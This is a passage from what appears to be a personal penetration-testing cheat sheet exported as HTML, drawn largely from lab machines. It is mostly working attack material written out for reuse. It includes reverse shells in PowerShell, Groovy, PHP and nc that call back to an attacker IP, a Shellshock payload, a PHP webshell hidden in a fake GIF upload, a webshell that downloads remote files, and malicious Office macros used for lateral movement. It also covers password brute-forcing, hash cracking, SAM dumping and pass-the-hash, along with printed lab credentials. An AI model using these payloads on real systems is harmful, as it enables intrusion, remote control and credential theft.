$data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()<br /></div><div class='page'><h1 class='title level-4'>Port Forwarding</h1><br/>Explanation:<br />	plink.exe requires you to SSH to Kali, and then uses the SSH tunnel to forward ports.<br />Useage:<br />	plink.exe &lt;kaliuser(root)&gt;@&lt;kaliIP&gt; -R &lt;kaliport&gt;:&lt;target-IP(probably 127.0.0.1)&gt;:&lt;target-port&gt;<br />Example:<br />	plink.exe root@192.168.11.5 -R 445:127.0.0.1:445 	(hit enter a couple times and you will be kicked out of your shell).<br />	winexe -U admin%password123 //127.0.0.1 cmd.exe	(you will be logging in via the target localport 445)</div><div class='page'><h1 class='title level-4'>RDP</h1><br/>expose internal port:<br />	netsh interface portproxy add v4tov4 listenaddress=172.16.2.2 listenport=3389 connectaddress=127.0.0.1 connectport=80<br />enable rdp<br />	enable-psremoting<br />	reg add &quot;hklm\system\currentcontrolset\control\terminal server\fdenytsconnections&quot; /v 0<br />	shutdown /r /t 00 /f<br />xfreerdp /u:&quot;administrator&quot; /v:my.server.net:61220</div><div class='page'><h1 class='title level-4'>Service Account Start</h1><br/>.\PSExec64.exe -i -u &quot;nt authority\local service&quot; C:\users\user\Desktop\Shell.exe</div><div class='page'><h1 class='title level-4'>Windows Subsystem for Linux (wsl)</h1><br/>Giveaway the it exists is often a “Distros” directory (often on the root) or an ubuntu.exe file laying around.<br /><br />access wsl by finding wither wsl.exe or bash.exe (or a bash.lnk file)<br /><br />VVTo find bash.exeVV <br />cd C:\windows <br />dir /s /b | findstr bash.exe<br /><br />once you are in, you can peruse the system with linux commands (in .bash_history i&#39;ve tended to find good stuff).</div><div class='page'><h1 class='title level-1'>Working On/With...</h1><br/><br /></div><div class='page'><h1 class='title level-2'>BruteForce</h1><br/><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></div><div class='page'><h1 class='title level-3'>cewl</h1><br/>cewl -a -e -m 5 -d 2 -w cewlwords.txt <a href="http://forum.bart.htb">http://forum.bart.htb</a></div><div class='page'><h1 class='title level-3'>crackmapexec</h1><br/></div><div class='page'><h1 class='title level-4'>smb</h1><br/>crackmapexec smb 10.10.10.161 -u userlist.txt -p passwordlist.txt</div><div class='page'><h1 class='title level-3'>wfuzz</h1><br/><br />wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt -d &quot;username=admin&amp;password=FUZZ&quot;  --hh 206 <a href="http://192.168.11.129/login.php">http://192.168.11.129/login.php</a><br /><br />wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt -d &quot;username=admin&amp;password=FUZZ&quot; <a href="http://192.168.11.129/login.php">http://192.168.11.129/login.php</a> | grep -v 206<br /><br />^^FUZZ is the magic word. replace admin with root and other potential usernames.^^<br />view page source and see if it is looking user, uname, username etc... same with pword.</div><div class='page'><h1 class='title level-3'>hydra</h1><br/>hydra -e nsr -l charles -P old-password.bak -t 6 ssh://192.168.11.129<br /><br /><br />hydra -l harvey -P /root/Desktop/Tools/Wordlists/rockyou.txt internal-01.bart.htb http-post-form &quot;/simple_chat/login.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login:Password&quot;<br /> <br /> hydra -s 8080 10.10.251.164 http-form-post &quot;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^:Invalid username or password&quot; -l admin -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -t 10 -w 30 <br /> <br /> HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C  /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 80 10.10.10.95 http-get /manager/html<br />^^forward to burp after auth attempt                     ^ to use collon sperated user:pass                                                                            ^Source port ip    http-get ^url<br />^^^^make sure intercept is OFF^^^ <br /><br />hydra -l wade -P ./fsocity.dic 10.10.163.14 -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</div><div class='page'><h1 class='title level-3'>Hashes</h1><br/><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></div><div class='page'><h1 class='title level-4'>hash identification</h1><br/>john hash.txt<br /><br /><a href="https://www.tunnelsup.com/hash-analyzer/">https://www.tunnelsup.com/hash-analyzer/</a><br /><br /><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a><br /><br />python3 /root/Desktop/Tools/hashID-3.1.4/hashid.py a936af92b0ae20b1ff6c3347a72e5fbe<br /><br /><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></div><div class='page'><h1 class='title level-4'>hash breaker</h1><br/>john hash.txt<br /><br />hashcat64.exe -m 3200 hash.txt /usr/share/dirb/wordlists/big.txt --force<br /><br />VVV On Squid&#39;s windows  VVV<br />hashcat64.exe -m 13100 yeet\active.txt yeet\rockyou.txt</div><div class='page'><h1 class='title level-4'>john</h1><br/>john hash.txt<br /><br /><br /><br /><br />zip2john file.zip &gt;&gt; AC.hash<br />john AC.hash --wordlist=words.txt</div><div class='page'><h1 class='title level-4'>gpp</h1><br/>gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<br />/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated<br />GPPstillStandingStrong2k18<br /><br />gpp-decrypt is GOLD<br />^^groups.xml <br />Group Policy shittt</div><div class='page'><h1 class='title level-3'>wordlists</h1><br/>If you want to spice up your wordlist...<br /><br />hashcat --force --stdout mylamelist.txt -r /usr/share/hashcat/rules/best64.rule &gt; myjuicylist.txt</div><div class='page'><h1 class='title level-2'>Burp</h1><br/></div><div class='page'><h1 class='title level-3'>shellshock</h1><br/>SHELLSHOCK<br />send a get request for 10.10.10.7:10000 to burp repeater<br />set useragent- <br />User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.60/3232 0&gt;&amp;1<br />in terminal<br />    nc -lvnp 3232<br />in burp<br />    go<br />in terminal<br />    enjoy your root shell!!</div><div class='page'><h1 class='title level-3'>php upload</h1><br/>WHEN UPLOADING FILE CAPTURE WITH BURP!!!!!!!<br />\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/<br />POST /support.php HTTP/1.1<br />Host: bank.htb<br />User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Referer: <a href="http://bank.htb/support.php">http://bank.htb/support.php<br /></a><br />Content-Type: multipart/form-data; boundary=---------------------------25819144810188292491428089033<br />Content-Length: 631<br />Cookie: HTBBankAuth=dbo8uvvaj95qmg0ebsgujbrmm2<br />Connection: close<br />Upgrade-Insecure-Requests: 1<br /><br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;title&quot;<br /><br />yeet<br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;message&quot;<br /><br />cannon<br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;PhpShell.gif.htb&quot;                                This line is also important<br />Content-Type: image/gif<br /><br />GIF89a/ &lt;?php echo system($_REQUEST[&#39;coolhand&#39;]); ?&gt;                                                                    THIS IS THE IMPORTANT LINE<br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;submitadd&quot;<br /><br /><br />-----------------------------25819144810188292491428089033--<br />\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/<br />needed to change the magic bytes to GIF89a/ so it would be read as a gif<br />replace shell code with generic php call back<br />changed name to PhpShell.gif.htb becasue there is a comment in the responce saying that .htb files will run as .php<br />navigate to /support/ page and hover over most recent upload to see its location (bank.htb/uploads/PhpShell.gif.htb)<br /><a href="http://bank.htb/uploads/PhpShell.gif.htb?coolhand=whoami">http://bank.htb/uploads/PhpShell.gif.htb?coolhand=whoami</a><br />wwwroot<br />in termial nc -nlvp 3232<br /><a href="http://bank.htb/uploads/PhpShell.gif.htb?coolhand=nc">http://bank.htb/uploads/PhpShell.gif.htb?coolhand=nc</a><a href="http://bank.htb/uploads/PhpShell.gif.htb?coolhand=nc%2010.10.14.60%203232%20-c%20/bin/bash"> 10.10.14.60 3232 -c /bin/bash</a><br />enjoy your shell!!!!!</div><div class='page'><h1 class='title level-2'>escaping</h1><br/></div><div class='page'><h1 class='title level-3'>escape sequences</h1><br/>python<br />    yeet &quot;$(/bin/bash)&quot;<br /><br />php<br />    yeet; whoami #<br />    <code>.* /etc/passwd #</code>  &lt; this is more for grep<br /><br />echo<br />    echo os.system(&quot;/bin/bash&quot;)</div><div class='page'><h1 class='title level-3'>Restricted Shell Escape</h1><br/>?<br />echo $PATH<br />cat $SHELL<br />/usr/bin/cat &lt; call commands by full path name<br />echo ‘#!/bin/bash’ &gt; exectue.txt<br />cd ..<br /><br /><a href="https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells">https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells</a></div><div class='page'><h1 class='title level-4'>lshell</h1><br/>echo import os<br />echo os.system(&#39;/bin/bash&#39;)<br /><br /><br />lshell is written in python (2?) and is shitty</div><div class='page'><h1 class='title level-2'>File Recovery</h1><br/>lsblk to see all drives/devices<br />cd into drive/device that file has been lost<br /><br />mount       to see where the data is stored<br />root@raspberrypi:/media/usbstick# mount<br />/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)<br /><br />strings         to see strings of data in the hex<br />root@raspberrypi:/media/usbstick# strings /dev/sdb<br />3d3e483143ff12ec505d026fa13e020b<br />Damnit! Sorry man I accidentally deleted your files off the USB stick.<br /><br />xxd /dev/sdb   to see in pure hex<br />grep -a ‘[a-z0-9]\{32\}’ /dev/sdb          will grep the hex values for lowercase letter or number, 32 in a row. (isnt regex fun?)<br /><br /><br /><br />for more wild File Recovery tools and techniques check out this ippsec video after the 10 minute mark<br /><a href="https://www.youtube.com/watch?v=SRmvRGUuuno&t=633s">https://www.youtube.com/watch?v=SRmvRGUuuno&amp;t=633s</a><br /><br /><br /></div><div class='page'><h1 class='title level-2'>FileTypes</h1><br/><br /></div><div class='page'><h1 class='title level-3'>doc</h1><br/></div><div class='page'><h1 class='title level-4'>docm/doc lateral movment</h1><br/>Running as Tire from UserBox, we will make a macro calling nc.exe in an excel document, use DCOM to move the file to bossman and then execute the macro getting a reverse shell on the kali box.<br />Create a macro that when executed will give you a reverse shell.<br /><a href=""><img src="images/1786-1.png" alt="images/1786-1.png" /></a><br />Run this these commands/this script from userbox, pointing at Bossman.<br /><div class="codebox"><div class="codebox">$com&nbsp;=&nbsp;[activator]::CreateInstance([type]::GetTypeFromProgId(&quot;Excel.Application&quot;,&quot;192.168.40.129&quot;))<br /><br />$LocalPath&nbsp;=&nbsp;&quot;C:\Users\tire\Desktop\Macro.xlsm&quot;&nbsp;<br /><br />$RemotePath&nbsp;=&nbsp;&quot;\\192.168.40.129\c$\Macro.xlsm&quot;&nbsp;<br /><br />[System.IO.File]::Copy($LocalPath,&nbsp;$RemotePath,&nbsp;$True)&nbsp;<br /><br />$Path&nbsp;=&nbsp;&quot;\\192.168.40.129\c$\Windows\sysWOW64\config\systemprofile\Desktop&quot;&nbsp;<br /><br />$temp&nbsp;=&nbsp;[system.io.directory]::createDirectory($Path)&nbsp;<br /><br />$Workbook&nbsp;=&nbsp;$com.Workbooks.Open(&quot;C:\Macro.xlsm&quot;)<br /><br />$com.Run(&quot;Yeeter&quot;)</div></div><br /><br /><a href=""><img src="images/1786-2.png" alt="images/1786-2.png" /></a><br /><br /><a href=""><img src="images/1786-3.png" alt="images/1786-3.png" /></a><br /><br />Note- You may need to add a firewall rule depending on the networks GPO to create the COM object.<br />New-NetFirewallRule -DisplayName &quot;Allow DCOM&quot; -Direction Inbound -Action Allow -Enabled True -RemoteAddress 192.168.40.133<br />Remove-NetFirewallRule -DisplayName “Allow DCOM”</div><div class='page'><h1 class='title level-4'>doc/docm Shell</h1><br/>Creating a Microsoft Word macro is as simple as choosing the VIEW ribbon and selecting Macros. We simply type a name for the macro and in the Macros in drop-down, select the name of the document the macro will be inserted into. When we click Create, a simple macro framework will be inserted into our document. Be sure to transfer in a binary friendly way (curl -O).<br /><br /><br />msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.132 lport=443 -f vba<br /><a href=""><img src="images/1787-1.png" alt="images/1787-1.png" /></a><br /><br /><a href=""><img src="images/1787-2.png" alt="images/1787-2.png" /></a><br /><br /><a href=""><img src="images/1787-3.png" alt="images/1787-3.png" /></a><br />^^^^^BE SURE TO CHANGE THE RIBBON TO MACROS IN DOCUMENT!!!^^^^^<br /><br /><a href=""><img src="images/1787-4.png" alt="images/1787-4.png" /></a><br /><br /><a href=""><img src="images/1787-5.png" alt="images/1787-5.png" /></a><br />If you close and reopen the document and this banner is on, you did good. If not, you probably did not select to add the macro just to the document (two pics up).<br /><br />Verify that the macro made it to the target with oletools.<br />pip install -U oletools<br /><br /><a href=""><img src="images/1787-6.png" alt="images/1787-6.png" /></a><br /><br /><br />Be sure to transfer in a binary friendly way (curl -O).<br />Once the file is executed, collect with nc -nlvp 443.</div><div class='page'><h1 class='title level-3'>dmp</h1><br/><br />file foo.dmp        to see what kind of dump it is<br /><br />volatility -f foo.dmp imageinfo         to see what kind of os it may be<br />volatility -f foo.dmp --profile Win2012R2x64 hashdump<br /><br /><br />if creds are dumped<br />pth-winexe -U Administrator%lmhashhhhhhhhhhhh:NTLMhashhhhhhhhh //10.10.10.82 cmd</div><div class='page'><h1 class='title level-3'>git</h1><br/>git clone<br /><br />git log             used to look at the history of pushes<br /><br />git log --stat | sort | uniq<br /><br />git show sldkjf2qe9r2423j234324234df<br /><br />git diff sldkjf2qe9r2423j234324234df        shows the diff between that commit and the previous</div><div class='page'><h1 class='title level-3'>groups.xml</h1><br/>gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<br />/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated<br />GPPstillStandingStrong2k18<br /><br />gpp-decrypt is GOLD<br />^^groups.xml <br />Group Policy shittt<br /><br /><br /><br />This is a file that sometimes holds credentials (pre windows 2012). These should be treated as normal creds. (use them for smb stuff and winrm and whatnot)</div><div class='page'><h1 class='title level-3'>kdbx\keepass</h1><br/>use keepass2john to get a hash of keepass to crack later<br />    keepass2john CEH.kdbx &gt; keepasshash.txt<br />    #make sure to drop the CEH: part<br />CEH:$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48<br /><br />go to <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a> to look up example hashes and find the right number (13400 in this case)<br />on host windows machine C:\Users\Squid\Desktop\BruteForce\hashcat-5.1.0&gt;hashcat64.exe -m 13400 yeet\jeeves.txt yeet\rockyou.txt<br />###note### You may have to delete a space from the end of *jeeves.txt*<br />hashcat gives the responce moonshine1<br /><br />now we can open the keepass file!!!<br />useing kali&#39;s keepass2 (or other times keepassx) we can now see the for things!!<br />most helpfully<br />dc recovery         S1TjAtJHKsugh9oC4VZl<br />backup stuff        aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00<br /><br />winexe -U jenkins/administrator%S1TjAtJHKsugh9oC4VZl //10.10.10.63 cmd.exe<br />pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe<br /><br /><br />S1TjAtJHKsugh9oC4VZl<br />aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</div><div class='page'><h1 class='title level-3'>mdb</h1><br/>can be read with excel (less than optimal)<br />can be read with klexi<br />ippsec reccomends mdbtools      (apt install mdbtools)      mdb-sql mdbtables<br /><br />run strings to quickly look for potential username/passwords<br />strings -n 8 file.mdb | sort -u &gt; words.txt<br /><br /><br />ippsec sermon<br />mkdir tables<br />for i in $(mdb-tables file.mdb); do mdb-export file.mdb $i &gt; tables/$i; done        this will make a directory full of contets for each table locally.<br />cd tables<br />wc -l | sort -n             shows you what tables have data and which are 1 line (empty)<br />cat dirs that are most juicy</div><div class='page'><h1 class='title level-3'>pem</h1><br/>a pem file is a ssh private key file which can be used to log in to ssh.<br /><br /><br />chmod 600 alice.pem <br />ssh alice@10.10.10.7 -i alice.pem</div><div class='page'><h1 class='title level-3'>ppk</h1><br/><br />A .ppk file is a putty ssh private key <br /><br />puttyzip2john alice.ppk         to get the password for it if there is one<br /><br />apt install putty-tools <br />puttygen alice.ppk -O private-openssh -o alice.pem                  private-openssh-new may be helpful aswell<br />chmod 600 alice.pem <br />ssh alice@10.10.10.7 -i alice.pem</div><div class='page'><h1 class='title level-3'>pst</h1><br/>readpst file.pst            this will create a readable .mbox file<br />more file.mbox            and now you can read the .pst file</div><div class='page'><h1 class='title level-3'>txt</h1><br/>Edit each line with prefix or suffix:<br />	cat wl.txt | while read line; do echo bob:$line; done &gt; wlu.txt</div><div class='page'><h1 class='title level-3'>vhd</h1><br/>A vhd is a virtual hard disk. They are often found in pairs, one being the boot partion, the other being where the data lies.<br /><br />7z l sdfasdfasdf.vhd        to list the files<br />7z x asdfasdfsdf.vhd        to extract the files (these can be huge, so not optimal)<br /><br /><br /><br />once you have the .vhd on the box (optimally haveing the drive that contains the vhd mounted. Then run guestmount to mount the .vhd as another drive<br />guestmount --add /mnt/Bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd<br />cd /mnt/vhd<br /><br />user<br /><br />c:\windows\system32\config<br />    sam (user database)<br />    system  registy hives (hklm) (system boot key)<br />    ntvs.dit if it is a dc<br />    <br />cp these dirs to /Yeet/Machines/HTB/Bastion/dbdump<br />run impacket-secretsdump on the file and BOOOM Hashes!!     <br />    <br />    <br />    <br />    <br />    <br />root@CoolHandKali:/Yeet/Machines/HTB/Bastion/dbdump# ls<br />SAM  SYSTEM<br />root@CoolHandKali:/Yeet/Machines/HTB/Bastion/dbdump# impacket-secretsdump -sam SAM -system SYSTEM local<br />Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation<br /><br />[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f<br />[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br />Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br />Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br />L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::<br />[*] Cleaning up... <br />root@CoolHandKali:/Yeet/Machines/HTB/Bastion/dbdump# <br /></div><div class='page'><h1 class='title level-3'>xlsm</h1><br/>Open in Windows Excel or use olevba to see the VBA scripts (macros) embeded in the file.<br /><br />pip install -U oletools<br /><a href="https://github.com/decalage2/oletools/blob/master/cheatsheet/oletools_cheatsheet.pdf">https://github.com/decalage2/oletools/blob/master/cheatsheet/oletools_cheatsheet.pdf</a><br />olevba3 filename.xlsm</div><div class='page'><h1 class='title level-3'>zip</h1><br/><em><span style="color:#666666;"># Install the full version 7zip.</span></em><em><br /></em><em><strong><span style="color:#c20cb9;">sudo</span></strong></em><em><strong> </strong></em><em><strong><span style="color:#c20cb9;">apt-get install</span></strong></em><em><strong> p7zip-full<br /> <br /></strong></em><em><strong><span style="color:#666666;"># Unzip your file.</span></strong></em><em><strong><br />7z  x  your-file.zip<br /> <br /></strong></em><em><strong><span style="color:#666666;"># Or unzip your password protected file.</span></strong></em><em><strong><br />7z  x  </strong></em><em><strong><span style="color:#660033;">-pPASSWORD</span></strong></em><em><strong>  your-file.zip</strong></em><br /><br />7z l -slt file.zip              this will show data on the zip file, specifically subarchives<br /><br />zip2john file.zip &gt; file.hash<br />john AC.hash --wordlist=words.txt</div><div class='page'><h1 class='title level-2'>IPTables</h1><br/><div class="codebox"><div class="codebox">#&nbsp;BASIC&nbsp;RULES<br />sudo&nbsp;iptables&nbsp;-A&nbsp;INPUT&nbsp;-i&nbsp;lo&nbsp;-j&nbsp;ACCEPT<br />sudo&nbsp;iptables&nbsp;-A&nbsp;INPUT&nbsp;-m&nbsp;conntrack&nbsp;--ctstate&nbsp;RELATED,ESTABLISHED&nbsp;-j&nbsp;ACCEPT<br />sudo&nbsp;iptables&nbsp;-A&nbsp;INPUT&nbsp;-m&nbsp;state&nbsp;--state&nbsp;RELATED,ESTABLISHED&nbsp;-j&nbsp;ACCEPT<br />sudo&nbsp;iptables&nbsp;-A&nbsp;INPUT&nbsp;-p&nbsp;tcp&nbsp;-m&nbsp;tcp&nbsp;--dport&nbsp;22&nbsp;-j&nbsp;ACCEPT<br /><br />sudo&nbsp;iptables&nbsp;-P&nbsp;INPUT&nbsp;DROP<br />sudo&nbsp;iptables&nbsp;-P&nbsp;FORWARD&nbsp;DROP<br />sudo&nbsp;iptables&nbsp;-P&nbsp;OUTPUT&nbsp;ACCEPT<br /><br /><br />#&nbsp;save&nbsp;iptables<br />sudo&nbsp;apt-get&nbsp;-y&nbsp;install&nbsp;debconf-utils<br />echo&nbsp;iptables-persistent&nbsp;iptables-persistent/autosave_v4&nbsp;boolean&nbsp;true&nbsp;|&nbsp;sudo&nbsp;debconf-set-selections<br />echo&nbsp;iptables-persistent&nbsp;iptables-persistent/autosave_v6&nbsp;boolean&nbsp;true&nbsp;|&nbsp;sudo&nbsp;debconf-set-selections<br />sudo&nbsp;apt-get&nbsp;-y&nbsp;install&nbsp;iptables-persistent<br />sudo&nbsp;service&nbsp;iptables-persistent&nbsp;save<br /><br /><br />#&nbsp;CHEAT&nbsp;SHEET<br />##&nbsp;Display&nbsp;rules<br />iptables&nbsp;-S<br />iptables&nbsp;-L&nbsp;--line-numbers<br /><br />##&nbsp;Insert&nbsp;in&nbsp;line&nbsp;number&nbsp;6<br />iptables&nbsp;-I&nbsp;INPUT&nbsp;6&nbsp;-p&nbsp;tcp&nbsp;-m&nbsp;tcp&nbsp;--dport&nbsp;80&nbsp;-j&nbsp;ACCEPT<br /><br />##&nbsp;Add&nbsp;comments<br />iptables&nbsp;-A&nbsp;INPUT&nbsp;-s&nbsp;192.168.1.1/32&nbsp;-p&nbsp;tcp&nbsp;-m&nbsp;tcp&nbsp;--dport&nbsp;80&nbsp;-m&nbsp;comment&nbsp;--comment&nbsp;&quot;office&quot;&nbsp;-j&nbsp;ACCEPT<br /><br />##&nbsp;bulk&nbsp;change<br />PORTS=&quot;3306&quot;<br />for&nbsp;PORT&nbsp;in&nbsp;$PORTS;<br />do<br />&nbsp;&nbsp;#echo&nbsp;$PORT<br />&nbsp;&nbsp;sudo&nbsp;iptables&nbsp;-A&nbsp;INPUT&nbsp;-p&nbsp;tcp&nbsp;-m&nbsp;tcp&nbsp;--dport&nbsp;$PORT&nbsp;-j&nbsp;ACCEPT<br />done&nbsp;</div></div></div><div class='page'><h1 class='title level-2'>LanguageTypes</h1><br/><br /></div><div class='page'><h1 class='title level-3'>groovy</h1><br/>cmd	= &quot;net user&quot;<br />println(cmd.execute().text)<br /><br /><br /><br />String host=&quot;10.10.14.60&quot;;<br />int port=3232;<br />String cmd=&quot;cmd.exe&quot;;<br />Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();<br /><br /><br />https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</div><div class='page'><h1 class='title level-3'>HQK Reporting Service</h1><br/>telnet 10.10.10.178 4386<br />help<br />debug (password)         &lt; to go into “admin” mode<br />setdir ..                        &lt; cd                   <br />session                         &lt; pwd<br />list                                &lt; ls<br />showquery 2                  &lt; cat  corresponding number in list<br /></div><div class='page'><h1 class='title level-3'>java decompile (jar)</h1><br/>cd /root/Desktop/Tools<br />java --add-opens java.base/jdk.internal.loader=ALL-UNNAMED --add-opens jdk.zipfs/jdk.nio.zipfs=ALL-UNNAMED -jar jd-gui-1.4.0.jar</div><div class='page'><h1 class='title level-3'>php</h1><br/>&lt;?php echo system($_REQUEST[&#39;coolhand&#39;]); ?&gt;                   navigate to <a href="http://hostname/dir/filename.php?coolhand=whoami">http://hostname/dir/filename.php?coolhand=whoami</a><br />&lt;?php echo shell_exec($_REQUEST[&#39;coolhand&#39;]); ?&gt;<br />&lt;?php echo exec($_REQUEST[&#39;coolhand&#39;]); ?&gt;<br /><br />php -a          inveractive</div><div class='page'><h1 class='title level-4'>test print script</h1><br/>&lt;?php<br />echo(&quot;Yeet to the Cannon&quot;)<br />?&gt;</div><div class='page'><h1 class='title level-4'>web</h1><br/><a href="https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp</a><br />                                                                             ^? is the stringer between file.php and arguments<br /><br />=YeetCannon.php%00  &lt;Not sure, but some kind of old php exploit<br /><br /><br />###################<br />PHP Wrapper<br />########<br />This vulnerability allows you to dump the actual code of a php file to screen in base64 format. Throw it in Cyber Chef and win the war!<br /><br /><a href="https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=timestamp">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=php://filter/convert.base64-encode/resource=timestamp</a><br />                                                                             ^stringer ^argumets that should be there<br />                                                                                                                          ^instead of directly calling &quot;timestamp&quot; i am inserting the base64 thing and then “=timestamp”<br />php://filter/convert.base64-encode/resource=yeet<br />                                                                    ^php filename you believe is there that you would like to dump<br />##################                                                                    <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />echo -n asdfsadfl;kjasdfoiuomefoijoisfjoidsjfoijfg | base64 -d &gt; yee.php</div><div class='page'><h1 class='title level-4'>webshell</h1><br/><div class="codebox"><div class="codebox">#In&nbsp;script&nbsp;Webshell<br />$webshell&nbsp;=&nbsp;&lt;&lt;&lt;&#39;EOD&#39;<br />&lt;?php<br />&nbsp;if&nbsp;(isset($_REQUEST[&#39;fupload&#39;]))&nbsp;{<br />&nbsp;&nbsp;file_put_contents($_REQUEST[&#39;fupload&#39;],&nbsp;file_get_contents(&quot;http://10.10.14.60:8000/&quot;&nbsp;.&nbsp;$_REQUEST[&#39;fupload&#39;]));<br />&nbsp;};<br />&nbsp;if&nbsp;(isset($_REQUEST[&#39;fexec&#39;]))&nbsp;{<br />&nbsp;&nbsp;$cmd&nbsp;=&nbsp;($_REQUEST[&#39;fexec&#39;]);<br />&nbsp;&nbsp;echo&nbsp;system($cmd);<br />&nbsp;};<br />?&gt;<br />EOD;</div></div><br />useage:<br />10.10.10.9:80/yee.php?fupload=nc.exe        &lt;looking for something hosted on your webserver<br />     <br />10.10.10.9:80/yee.php?fexec=nc.exe 10.10.14.60 3232 -e cmd.exe<br /><br /><br /><br /><br /><br /><br /><br />&lt;?php $sock=fsockopen(&quot;10.10.14.3&quot;,3232);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes); ?&gt;</div><div class='page'><h1 class='title level-4'>rfi checks</h1><br/>&lt;?php<br />echo “howdy”;<br />?&gt;<br /><br 